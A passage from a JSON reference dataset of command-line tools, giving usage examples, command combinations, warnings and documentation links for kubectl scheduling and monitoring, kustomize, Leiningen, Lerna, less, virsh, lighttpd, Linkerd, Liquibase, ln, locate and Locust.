      "kubectl apply -f - <<EOF\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: scheduler-config\n  namespace: kube-system\ndata:\n  config.yaml: |\n    apiVersion: kubescheduler.config.k8s.io/v1beta3\n    kind: KubeSchedulerConfiguration\n    profiles:\n    - schedulerName: custom-scheduler\n      plugins:\n        score:\n          enabled:\n          - name: NodeResourcesFit\n          - name: NodeAffinity\n          disabled:\n          - name: NodeResourcesLeastAllocated\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: custom-scheduled-pod\nspec:\n  schedulerName: custom-scheduler\n  containers:\n  - name: app\n    image: nginx\nEOF  # Configure custom scheduler and schedule pod using it"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "kubectl <scheduling-command> [options]",
    "prerequisites": [
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Multi-zone deployment with affinity",
        "commands": "kubectl label nodes node-1 topology.kubernetes.io/zone=us-west-1a && kubectl label nodes node-2 topology.kubernetes.io/zone=us-west-1b && kubectl apply -f deployment-with-zone-anti-affinity.yaml && kubectl get pods -o wide",
        "explanation": "Label nodes with zones, deploy with zone anti-affinity, and verify distribution",
        "title": "kubectl && kubectl && kubectl && kubectl"
      },
      {
        "scenario": "Resource-constrained environment setup",
        "commands": "kubectl create namespace constrained && kubectl apply -f resource-quota.yaml -n constrained && kubectl apply -f limit-range.yaml -n constrained && kubectl describe namespace constrained",
        "explanation": "Create namespace with resource constraints and inspect final configuration",
        "title": "kubectl && kubectl && kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl-top",
        "relationship": "combo",
        "reason": "Monitor resource usage to inform scheduling decisions"
      },
      {
        "name": "prometheus",
        "relationship": "combo",
        "reason": "Metrics inform VPA and HPA scaling decisions"
      },
      {
        "name": "cluster-autoscaler",
        "relationship": "combo",
        "reason": "Automatically scale cluster nodes based on scheduling needs"
      }
    ],
    "warnings": [
      "Pod affinity rules can lead to unschedulable pods if too restrictive",
      "Priority preemption can cause service disruption for lower-priority workloads",
      "VPA recommendations may not account for application-specific requirements"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/concepts/scheduling-eviction/"
      },
      {
        "platform": "macos",
        "url": "https://kubernetes.io/docs/concepts/scheduling-eviction/"
      },
      {
        "platform": "windows",
        "url": "https://kubernetes.io/docs/concepts/scheduling-eviction/"
      },
      {
        "platform": "generic",
        "url": "https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kubernetes-monitoring-observability",
    "subtitle": "Kubernetes Monitoring and Observability",
    "description": "Kubernetes monitoring, logging, and observability",
    "examples": [
      "kubectl top nodes --sort-by=cpu && kubectl top pods --all-namespaces --sort-by=memory  # Monitor node CPU usage and pod memory consumption across all namespaces",
      "kubectl get events --sort-by=.metadata.creationTimestamp --field-selector involvedObject.kind=Pod,reason!=Scheduled  # Get recent pod events excluding normal scheduling events",
      "kubectl logs -l app=web --tail=100 --since=1h --prefix=true -f  # Follow logs from all web app pods with timestamps from last hour",
      "kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml && kubectl get apiservice v1beta1.metrics.k8s.io -o yaml  # Deploy metrics server and verify API service registration",
      "helm repo add prometheus-community https://prometheus-community.github.io/helm-charts && helm install prometheus prometheus-community/kube-prometheus-stack --set grafana.adminPassword=admin123  # Install Prometheus operator stack with Grafana for monitoring",
      "kubectl create namespace observability && kubectl create -f https://github.com/jaegertracing/jaeger-operator/releases/latest/download/jaeger-operator.yaml -n observability  # Deploy Jaeger operator for distributed tracing in dedicated namespace"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "kubectl <monitoring-command> [options]",
    "prerequisites": [
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete observability stack deployment",
        "commands": "kubectl create namespace monitoring && helm install prometheus prometheus-community/kube-prometheus-stack -n monitoring && kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/cloud/deploy.yaml",
        "explanation": "Deploy monitoring namespace, Prometheus stack, and ingress for external access",
        "title": "kubectl && helm && kubectl"
      },
      {
        "scenario": "Application performance investigation",
        "commands": "kubectl describe pod webapp-123 && kubectl logs webapp-123 --previous && kubectl get events --field-selector involvedObject.name=webapp-123 --sort-by=.metadata.creationTimestamp",
        "explanation": "Investigate pod issues using description, previous logs, and related events",
        "title": "kubectl && kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "prometheus",
        "relationship": "combo",
        "reason": "Prometheus provides metrics collection for Kubernetes"
      },
      {
        "name": "grafana",
        "relationship": "combo",
        "reason": "Grafana visualizes Kubernetes metrics and logs"
      },
      {
        "name": "jaeger",
        "relationship": "combo",
        "reason": "Jaeger provides distributed tracing for microservices"
      }
    ],
    "warnings": [
      "Metrics server requires proper certificates and network configuration",
      "Log retention policies should be configured to prevent disk space issues",
      "Monitoring overhead can impact cluster performance if not properly configured"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/tasks/debug-application-cluster/"
      },
      {
        "platform": "macos",
        "url": "https://kubernetes.io/docs/tasks/debug-application-cluster/"
      },
      {
        "platform": "windows",
        "url": "https://kubernetes.io/docs/tasks/debug-application-cluster/"
      },
      {
        "platform": "generic",
        "url": "https://kubernetes.io/docs/concepts/cluster-administration/monitoring/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kustomize",
    "subtitle": "Kustomize",
    "description": "Template-free way to customize Kubernetes YAML configurations",
    "examples": [
      "kustomize build ./overlays/production  # Generate final Kubernetes YAML from Kustomize directory",
      "kustomize create --resources deployment.yaml,service.yaml,configmap.yaml  # Generate kustomization.yaml from existing resources",
      "kustomize edit set image myapp=myapp:v2.0.0  # Update image tag in kustomization file",
      "kustomize edit add resource secret.yaml  # Add new resource to kustomization file",
      "kustomize edit add configmap app-config --from-file=config.properties  # Create ConfigMap generator from file",
      "kustomize edit add secret app-secret --from-literal=username=admin --from-literal=password=secret123  # Create Secret generator from literal values",
      "kustomize edit set namespace production  # Set namespace for all resources",
      "kustomize edit add label app:myapp  # Add common labels to all resources",
      "kustomize edit add transformer ../../transformers/namespace.yaml && kustomize edit set replicas deployment=webapp:5 && kustomize build . | kubectl diff -f - && kustomize build . | kubectl apply -f -  # Add custom transformers, set replicas, preview changes, and apply if acceptable"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "kustomize [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete overlay setup",
        "commands": "mkdir -p overlays/production && cd overlays/production && kustomize create --resources ../../base && kustomize edit set namespace production && kustomize edit set image myapp=myapp:v1.0.0",
        "explanation": "Create production overlay with namespace and image customization",
        "title": "mkdir && cd && kustomize && kustomize && kustomize"
      },
      {
        "scenario": "Deploy with kubectl",
        "commands": "kustomize build ./overlays/production | kubectl apply -f -",
        "explanation": "Build Kustomize manifests and apply to cluster",
        "title": "kustomize | kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "kubectl has built-in kustomize support with -k flag"
      },
      {
        "name": "helm",
        "relationship": "alternative",
        "reason": "Alternative templating solution for Kubernetes"
      }
    ],
    "warnings": [
      "Base and overlay structure important for maintainability",
      "Kustomization files must be in same directory as resources",
      "kubectl -k flag provides built-in kustomize functionality",
      "Strategic merge patches can be complex for deeply nested resources"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kustomize.io/"
      },
      {
        "platform": "macos",
        "url": "https://kustomize.io/"
      },
      {
        "platform": "windows",
        "url": "https://kustomize.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kustomize-configuration",
    "subtitle": "Kustomize Configuration Management",
    "description": "Kubernetes configuration management with Kustomize",
    "examples": [
      "kustomize build overlays/production | kubectl apply -f -  # Build production overlay configuration and apply to cluster",
      "kustomize create --autodetect --recursive && kustomize edit add configmap app-config --from-file=config.properties  # Auto-generate kustomization file and add ConfigMap generator",
      "kustomize edit add patch --kind Deployment --name webapp --patch deployment-patch.yaml  # Add strategic merge patch for deployment configuration",
      "kustomize build overlays/staging --enable-alpha-plugins | kubectl diff -f - && kustomize build overlays/staging | kubectl apply -f -  # Preview staging changes with diff and apply if acceptable",
      "kustomize edit add secret generic app-secrets --from-file=secrets/ --disableNameSuffixHash  # Generate secret from files without name suffix hash",
      "kustomize edit set image myapp=myregistry.com/myapp:v1.2.3 && kustomize build . > deployment.yaml  # Update image tag and generate final deployment manifest",
      "kustomize create --resources base/ --namespace production && kustomize edit add configmap app-config --from-file=config/prod.properties --from-literal=LOG_LEVEL=INFO && kustomize edit add secret app-secrets --from-env-file=secrets/.env.prod --type=Opaque  # Create production overlay with namespace, ConfigMap from file and literals, and Secret from environment file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "kustomize <command> [options]",
    "prerequisites": [
      "kustomize-cli"
    ],
    "commandCombinations": [
      {
        "scenario": "GitOps workflow with validation",
        "commands": "kustomize build overlays/production > manifests.yaml && kubeval manifests.yaml && kubectl apply --dry-run=server -f manifests.yaml",
        "explanation": "Build manifests, validate with kubeval, and perform server-side dry run",
        "title": "kustomize > manifests && kubeval && kubectl"
      },
      {
        "scenario": "Multi-cluster deployment preparation",
        "commands": "kustomize build overlays/us-west > us-west-manifests.yaml && kustomize build overlays/eu-west > eu-west-manifests.yaml && kubectl apply -f us-west-manifests.yaml --context=us-west",
        "explanation": "Build region-specific manifests and deploy to appropriate clusters",
        "title": "kustomize > us && kustomize > eu && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Kustomize output is applied to Kubernetes with kubectl"
      },
      {
        "name": "helm",
        "relationship": "alternative",
        "reason": "Both provide Kubernetes configuration templating"
      },
      {
        "name": "git",
        "relationship": "combo",
        "reason": "Kustomize configurations are typically version controlled"
      }
    ],
    "warnings": [
      "Kustomization file structure and patching order matter significantly",
      "Resource name transformations can break references between resources",
      "Alpha plugins may not be available in all environments"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kustomize.io/"
      },
      {
        "platform": "macos",
        "url": "https://kustomize.io/"
      },
      {
        "platform": "windows",
        "url": "https://kustomize.io/"
      },
      {
        "platform": "generic",
        "url": "https://kubectl.docs.kubernetes.io/guides/introduction/kustomize/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lein",
    "subtitle": "Leiningen",
    "description": "Build automation and dependency management for Clojure",
    "examples": [
      "lein new app myapp  # Generate new Clojure application project",
      "lein repl  # Start interactive Clojure REPL with project classpath",
      "lein test  # Execute test suite",
      "lein jar  # Create JAR file from project",
      "lein uberjar  # Create self-contained JAR with dependencies",
      "lein run  # Execute main function",
      "lein deps  # Download and install project dependencies",
      "lein new luminus mywebapp +postgres +auth +swagger && cd mywebapp && lein run migrate && lein test && lein uberjar && java -jar target/mywebapp.jar  # Create full-stack web application with database, authentication, API docs, run migrations, test, build, and deploy"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "lein [task] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Build and deploy workflow",
        "commands": "lein test && lein uberjar && java -jar target/myapp-standalone.jar",
        "explanation": "Test, build standalone JAR, and run application",
        "title": "lein && lein && java"
      }
    ],
    "relatedCommands": [
      {
        "name": "clojure",
        "relationship": "runtime",
        "reason": "Leiningen builds Clojure applications"
      },
      {
        "name": "boot",
        "relationship": "alternative",
        "reason": "Boot is alternative build tool for Clojure"
      }
    ],
    "warnings": [
      "Uses project.clj for project configuration",
      "Excellent plugin ecosystem",
      "Can generate various project templates"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://leiningen.org/"
      },
      {
        "platform": "macos",
        "url": "https://leiningen.org/"
      },
      {
        "platform": "windows",
        "url": "https://leiningen.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lerna",
    "subtitle": "Lerna",
    "description": "Tool for managing JavaScript monorepos",
    "examples": [
      "lerna init  # Initialize new Lerna monorepo structure",
      "lerna create my-package  # Scaffold new package in packages directory",
      "lerna bootstrap  # Install dependencies and link packages together",
      "lerna run test  # Execute 'test' script in all packages",
      "lerna run build --scope=my-package  # Run build only in my-package",
      "lerna publish  # Version and publish changed packages to npm",
      "lerna version  # Version packages without publishing",
      "lerna exec --scope=@myorg/shared-* -- npm audit fix && lerna run build --stream --concurrency=4 && lerna publish --registry=https://npm.mycompany.com --dist-tag=beta  # Audit and fix security issues in shared packages, build with concurrency, and publish to private registry with beta tag"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "lerna <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete monorepo setup",
        "commands": "lerna init && lerna create shared-utils && lerna create web-app && lerna bootstrap",
        "explanation": "Initialize repo, create packages, and link dependencies",
        "title": "lerna && lerna && lerna && lerna"
      },
      {
        "scenario": "Build and test workflow",
        "commands": "lerna run build && lerna run test --parallel",
        "explanation": "Build all packages then run tests in parallel",
        "title": "lerna && lerna"
      }
    ],
    "relatedCommands": [
      {
        "name": "nx",
        "relationship": "alternative",
        "reason": "Modern monorepo tool with better performance"
      },
      {
        "name": "rush",
        "relationship": "alternative",
        "reason": "Microsoft's scalable monorepo manager"
      },
      {
        "name": "yarn",
        "relationship": "combo",
        "reason": "Yarn workspaces can complement Lerna"
      }
    ],
    "warnings": [
      "Can be slow with many packages",
      "Dependency management can be complex",
      "Publishing workflow requires proper Git setup"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://lerna.js.org/"
      },
      {
        "platform": "macos",
        "url": "https://lerna.js.org/"
      },
      {
        "platform": "windows",
        "url": "https://lerna.js.org/"
      },
      {
        "platform": "generic",
        "url": "https://github.com/lerna/lerna#readme"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "less",
    "subtitle": "less is more",
    "description": "View file contents page by page with navigation",
    "examples": [
      "less application.log  # View file with ability to scroll up/down and search",
      "less +/error app.log  # Open file and jump to first occurrence of 'error'",
      "less +F server.log  # Similar to tail -f, shows new content as it's added",
      "ps aux | less  # Pipe command output through less for easy browsing",
      "less +G -S -N /var/log/nginx/access.log  # Open log file at end, disable line wrapping, show line numbers for production log analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "less [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Search and navigate large files",
        "commands": "grep -n 'pattern' file.txt | less",
        "explanation": "Find matches with line numbers, browse results in less",
        "title": "grep | less"
      }
    ],
    "relatedCommands": [
      {
        "name": "more",
        "relationship": "similar",
        "reason": "Older pager with fewer features"
      },
      {
        "name": "cat",
        "relationship": "alternative",
        "reason": "Use cat for small files, less for large ones"
      }
    ],
    "warnings": [
      "Press 'q' to quit less",
      "Use '/' to search forward, '?' to search backward"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/less.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/less.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "libvirt",
    "subtitle": "Library Virtualization",
    "description": "Virtualization API and management tools",
    "examples": [
      "virsh list --all  # Show all virtual machines (running and stopped)",
      "virsh start vm-name  # Start specified virtual machine",
      "virsh define vm-config.xml  # Define new VM from XML configuration file",
      "virsh console vm-name  # Connect to virtual machine serial console",
      "virsh snapshot-create-as vm-name snapshot-name  # Create named snapshot of virtual machine",
      "virt-clone --original vm-original --name vm-clone --auto-clone  # Clone existing VM with automatic storage allocation",
      "virsh vol-create-as --pool default --name vm-data.qcow2 --capacity 20G --format qcow2 && virsh attach-disk vm-web /var/lib/libvirt/images/vm-data.qcow2 --target vdb --persistent && virsh reboot vm-web  # Create additional storage volume, attach to running VM, and reboot to recognize new disk"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "virsh [options] command [domain]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "VM deployment workflow",
        "commands": "virsh define new-vm.xml && virsh start new-vm && virsh autostart new-vm && virsh dominfo new-vm",
        "explanation": "Define VM, start it, enable autostart, show info",
        "title": "virsh && virsh && virsh && virsh"
      }
    ],
    "relatedCommands": [
      {
        "name": "qemu",
        "relationship": "alternative",
        "reason": "Direct QEMU command-line interface"
      },
      {
        "name": "virt-manager",
        "relationship": "alternative",
        "reason": "GUI management tool for libvirt"
      }
    ],
    "warnings": [
      "Requires proper libvirtd configuration",
      "User permissions needed for VM management"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://libvirt.org/manpages/virsh.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "lighttpd",
    "subtitle": "Lighty",
    "description": "Lightweight web server optimized for speed and low memory usage",
    "examples": [
      "sudo lighttpd -f /etc/lighttpd/lighttpd.conf  # Start lighttpd with configuration file",
      "lighttpd -t -f /etc/lighttpd/lighttpd.conf  # Test configuration file syntax",
      "lighttpd -D -f /etc/lighttpd/lighttpd.conf  # Start in foreground for debugging",
      "lighttpd -v  # Display version and compile-time options",
      "lighttpd -p -f /etc/lighttpd/lighttpd.conf  # Print final configuration after processing",
      "lighttpd -f /etc/lighttpd/lighttpd.conf -m /usr/lib/lighttpd && echo 'server.bind = \"0.0.0.0\"\nserver.port = 8080\nserver.modules = (\"mod_fastcgi\", \"mod_rewrite\")' >> custom.conf  # Start with module path and create custom production configuration for high-traffic deployment"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "lighttpd [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Validate and start server",
        "commands": "lighttpd -t -f lighttpd.conf && sudo lighttpd -f lighttpd.conf",
        "explanation": "Test configuration then start server",
        "title": "lighttpd && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "nginx",
        "relationship": "similar",
        "reason": "Both lightweight, high-performance web servers"
      },
      {
        "name": "apache2",
        "relationship": "alternative",
        "reason": "Traditional web server with different resource usage"
      },
      {
        "name": "systemctl",
        "relationship": "combo",
        "reason": "Manage lighttpd as system service"
      }
    ],
    "warnings": [
      "Less popular than nginx/apache, fewer online resources",
      "Configuration syntax unique to lighttpd",
      "Module system different from Apache"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://redmine.lighttpd.net/projects/lighttpd/wiki"
      },
      {
        "platform": "macos",
        "url": "https://redmine.lighttpd.net/projects/lighttpd/wiki"
      },
      {
        "platform": "generic",
        "url": "https://redmine.lighttpd.net/projects/lighttpd/wiki/TutorialConfiguration"
      }
    ],
    "distroNotes": {
      "linux": "Available in most package repositories",
      "macos": "Install via Homebrew: brew install lighttpd",
      "windows": "Available but less common"
    }
  },
  {
    "name": "linkerd",
    "subtitle": "Linkerd",
    "description": "Lightweight service mesh for Kubernetes",
    "examples": [
      "linkerd check --pre  # Verify cluster meets Linkerd requirements",
      "linkerd install | kubectl apply -f -  # Install Linkerd control plane to cluster",
      "linkerd check  # Validate Linkerd installation and health",
      "kubectl get deploy -o yaml | linkerd inject - | kubectl apply -f -  # Add Linkerd proxy to existing deployments",
      "linkerd viz top deploy  # Show real-time traffic for deployments",
      "linkerd viz dashboard  # Launch Linkerd web dashboard",
      "linkerd viz stat deploy  # Display success rates and latencies for deployments",
      "linkerd viz profile --tap deploy/webapp --tap-duration 30s  # Generate service profile from live traffic",
      "linkerd install --config=custom-values.yaml | kubectl apply -f - && linkerd viz install | kubectl apply -f - && linkerd multicluster install | kubectl apply -f - && linkerd check --proxy  # Install Linkerd with custom configuration, visualization dashboard, multi-cluster support, and verify proxy injection"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "linkerd [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete Linkerd installation",
        "commands": "linkerd check --pre && linkerd install | kubectl apply -f - && linkerd check",
        "explanation": "Verify prerequisites, install Linkerd, and validate installation",
        "title": "linkerd && linkerd | kubectl && linkerd"
      },
      {
        "scenario": "Service mesh injection",
        "commands": "kubectl annotate namespace production linkerd.io/inject=enabled && kubectl rollout restart deployment -n production",
        "explanation": "Enable injection for namespace and restart deployments",
        "title": "kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Linkerd operates on Kubernetes using kubectl"
      },
      {
        "name": "istioctl",
        "relationship": "alternative",
        "reason": "Alternative service mesh solution"
      }
    ],
    "warnings": [
      "Requires cluster admin permissions for installation",
      "Proxy injection can be enabled per namespace or per workload",
      "Resource consumption lower than Istio but features differ",
      "Custom install needed for production hardening"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://linkerd.io/2/reference/cli/"
      },
      {
        "platform": "macos",
        "url": "https://linkerd.io/2/reference/cli/"
      },
      {
        "platform": "windows",
        "url": "https://linkerd.io/2/reference/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "liquibase",
    "subtitle": "Liquibase",
    "description": "Database schema change management and migration tool",
    "examples": [
      "liquibase --url=jdbc:postgresql://localhost/mydb --username=dbuser --password=secret update  # Apply all pending changesets to database",
      "liquibase --url=jdbc:postgresql://localhost/mydb --username=dbuser --password=secret updateSQL  # Show SQL that would be executed without running it",
      "liquibase --url=jdbc:postgresql://localhost/mydb --username=dbuser --password=secret rollback v1.0  # Rollback database to specific tagged version",
      "liquibase --url=jdbc:postgresql://localhost/mydb --username=dbuser --password=secret status  # Display list of pending changesets",
      "liquibase --url=jdbc:postgresql://localhost/mydb --username=dbuser --password=secret generateChangeLog  # Create changelog from existing database schema",
      "liquibase --url=jdbc:postgresql://localhost/mydb --username=dbuser --password=secret changelogSync  # Mark all changesets as executed without running them",
      "liquibase --url=jdbc:postgresql://localhost/mydb --username=dbuser --password=secret validate  # Check changelog for errors and conflicts",
      "liquibase --url=jdbc:postgresql://localhost/mydb --username=dbuser --password=secret clearCheckSums  # Remove all stored checksums to allow modified changesets",
      "liquibase --url=jdbc:postgresql://prod-db:5432/app --username=$DB_USER --password=$DB_PASS --contexts=production --changeLogFile=db-changelog.xml update && liquibase tag production-v2.1.0 && liquibase --url=jdbc:postgresql://prod-replica:5432/app updateSQL > rollback-plan.sql  # Production deployment with context filtering, version tagging, and rollback plan generation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "liquibase [options] command",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe deployment workflow",
        "commands": "liquibase validate && liquibase updateSQL > preview.sql && liquibase tag pre-deploy && liquibase update",
        "explanation": "Validate, preview, tag, then deploy changes",
        "title": "liquibase && liquibase > preview && liquibase && liquibase"
      }
    ],
    "relatedCommands": [
      {
        "name": "flyway",
        "relationship": "alternative",
        "reason": "Alternative database migration tool"
      },
      {
        "name": "dbmate",
        "relationship": "alternative",
        "reason": "Simpler database migration tool"
      }
    ],
    "warnings": [
      "Changesets are immutable once executed",
      "XML format can be verbose compared to plain SQL",
      "Rollback strategies must be planned in advance"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.liquibase.com/"
      },
      {
        "platform": "macos",
        "url": "https://docs.liquibase.com/"
      },
      {
        "platform": "windows",
        "url": "https://docs.liquibase.com/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ln",
    "subtitle": "link",
    "description": "Create links between files",
    "examples": [
      "ln -s /path/to/original /path/to/link  # Create symbolic link pointing to target file",
      "ln original.txt hardlink.txt  # Create hard link to file (same inode)",
      "ln -s /usr/local/bin ~/bin  # Create symbolic link to directory",
      "ln -sf /new/target existing-link  # Replace existing link with new target",
      "ln -sr ../config/app.conf current-config  # Create relative symbolic link (GNU coreutils)",
      "find /opt/app/releases -name 'v*' -type d | sort -V | tail -5 | while read dir; do ln -sfn \"$dir\" /opt/app/current-$(basename \"$dir\"); done  # Create symlinks for the 5 most recent application releases for easy rollback management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "ln [options] <target> <link_name>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create backup and link",
        "commands": "cp important.conf important.conf.backup && ln -s important.conf.backup current.conf",
        "explanation": "Backup file and create link to backup",
        "title": "cp && ln"
      },
      {
        "scenario": "Organize downloads with links",
        "commands": "ln -s ~/Downloads/project-v1.0.tar.gz ~/workspace/project.tar.gz",
        "explanation": "Link downloaded file to workspace with simpler name",
        "title": "ln"
      }
    ],
    "relatedCommands": [
      {
        "name": "cp",
        "relationship": "alternative",
        "reason": "Copy files instead of linking them"
      },
      {
        "name": "ls",
        "relationship": "combo",
        "reason": "Use ls -la to see link targets"
      },
      {
        "name": "readlink",
        "relationship": "combo",
        "reason": "Read symbolic link targets"
      }
    ],
    "warnings": [
      "Hard links cannot cross filesystem boundaries",
      "Deleting original file breaks symbolic links but not hard links",
      "Symbolic links can create loops if not careful"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/ln.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/ln.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/ln-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL; Windows has mklink for native linking"
    }
  },
  {
    "name": "locate",
    "subtitle": "locate",
    "description": "Find files using a pre-built database for fast searching",
    "examples": [
      "locate nginx.conf  # Search for nginx.conf files using pre-indexed database",
      "locate -i README  # Find README files regardless of case",
      "locate -n 10 '*.log'  # Show only first 10 log files found",
      "locate -b '\\nginx.conf'  # Match only the exact filename, not path components",
      "locate -S  # Display information about the locate database",
      "locate -i --regex '^/etc/.*\.conf$' | xargs -I {} sh -c 'test -r \"{}\" && echo \"{}\"' | head -20  # Find readable configuration files in /etc with case-insensitive regex pattern matching"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "locate [options] <pattern>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Update database and search",
        "commands": "sudo updatedb && locate myfile",
        "explanation": "Refresh locate database then search for file",
        "title": "sudo && locate"
      },
      {
        "scenario": "Count files of specific type",
        "commands": "locate '*.py' | wc -l",
        "explanation": "Count total Python files in system",
        "title": "locate | wc"
      }
    ],
    "relatedCommands": [
      {
        "name": "find",
        "relationship": "alternative",
        "reason": "More powerful but slower real-time search"
      },
      {
        "name": "updatedb",
        "relationship": "combo",
        "reason": "Updates the database that locate uses"
      },
      {
        "name": "fd",
        "relationship": "alternative",
        "reason": "Modern fast file finder with simpler syntax"
      }
    ],
    "warnings": [
      "locate database may be outdated - use updatedb to refresh",
      "Requires mlocate or findutils package to be installed",
      "Database is typically updated daily via cron job"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/locate.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/locate.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/findutils/manual/html_mono/find.html#Database-Locations"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "locust",
    "subtitle": "Locust",
    "description": "Python-based load testing tool with web UI",
    "examples": [
      "locust -f locustfile.py  # Start Locust with web interface for interactive testing",
      "locust -f locustfile.py --headless -u 100 -r 10 -t 60s  # Run headless test with 100 users, spawn rate 10/sec, for 60 seconds",
      "locust -f locustfile.py --master  # Start master node for distributed load testing",
      "locust -f locustfile.py --worker --master-host=master-ip  # Start worker node connecting to master",
      "locust -f locustfile.py --host=https://example.com  # Override host specified in locustfile",
      "locust -f api_loadtest.py --master --master-bind-host=0.0.0.0 --master-bind-port=5557 --web-port=8089 && locust -f api_loadtest.py --worker --master-host=load-master.internal --processes=4  # Set up distributed load testing with master accepting workers on all interfaces and multiple worker processes"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "locust [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated load test",
        "commands": "locust -f api_test.py --headless -u 50 -r 5 -t 300s --html report.html",
        "explanation": "Run 5-minute load test and generate HTML report",
        "title": "locust"
      }
    ],
    "relatedCommands": [
      {
        "name": "jmeter",
        "relationship": "alternative",
        "reason": "JMeter provides GUI-based test creation"
      },
      {
        "name": "k6",
        "relationship": "alternative",
        "reason": "k6 uses JavaScript instead of Python"
      }
    ],
    "warnings": [
      "Python-based test scenarios are very flexible",
      "Web UI provides real-time monitoring during tests",
      "Easy to distribute across multiple machines"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.locust.io/"
      },
      {
        "platform": "macos",
        "url": "https://docs.locust.io/"
      },
      {
        "platform": "windows",
        "url": "https://docs.locust.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "loginctl",
    "subtitle": "Login Control",
